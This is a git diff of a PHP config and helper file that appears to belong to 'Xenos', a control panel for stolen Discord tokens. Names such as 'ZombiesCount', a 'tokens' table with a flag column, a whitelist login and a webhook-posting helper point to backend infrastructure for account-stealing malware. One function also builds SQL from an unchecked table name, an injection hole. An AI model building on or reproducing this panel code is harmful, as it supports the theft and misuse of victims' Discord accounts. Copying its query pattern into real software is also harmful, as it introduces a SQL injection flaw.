@@ -1,39 +1,48 @@
 <?php
     require_once('database.php');
-    $login_password = "PASSWORD FOR SIGN IN";
+
+    // 
     $api_password = "PASSWORD FOR API";
+    $webhook = "YOUR DISCORD WEBHOOK";
 
-    $logs_webhook = "LOGS WEBHOOK";
-    $api_webhook = "API WEBHOOK";
-
-    $base_url = "BASE URL/IP OF YOUR HOST";
+    // For Authentification System (Require)
+    $OAUTH2_CLIENT_ID = 'DISCORD OAUTH CLIENT ID';
+    $OAUTH2_CLIENT_SECRET = 'OAUTH CLIENT SECRET';
+    $RedirectUrl = 'http://yoursite.com/Xenos/async/login';
+    $WhitelistIds = array("WL FOR YOUR IDS","...", "..");
 
     function CheckLogin(){
-        if(isset($_SESSION['token'])) {
-            return true;
-        } else {
-            return false;
-        }
+        if(isset($_SESSION['access_token'])) { return true; }
+        else { return false; }
     }
 
-    function ZombiesCount(){
+    function GetCount($table) {
         global $bdd;
-        $req = $bdd->prepare('SELECT * FROM tokens');
+        $req = $bdd->prepare('SELECT * FROM ' . htmlspecialchars($table));
+        $req->execute();
+        return $req->rowCount();
+    }
+
+    function GetFlagedCount() {
+        global $bdd;
+        $req = $bdd->prepare('SELECT * FROM tokens WHERE isflaged = 1');
         $req->execute();
         return $req->rowCount();
     }
 
     function SendToWebhook($webhook, $data) {
         $ch = curl_init($webhook);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt_array($ch, array(
+            CURLOPT_HTTPHEADER => array(
+                "Content-Type: application/json"
+            ),
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_RETURNTRANSFER => true
+        ));
 
         curl_exec($ch);
         curl_close($ch);
     }
-
 ?>
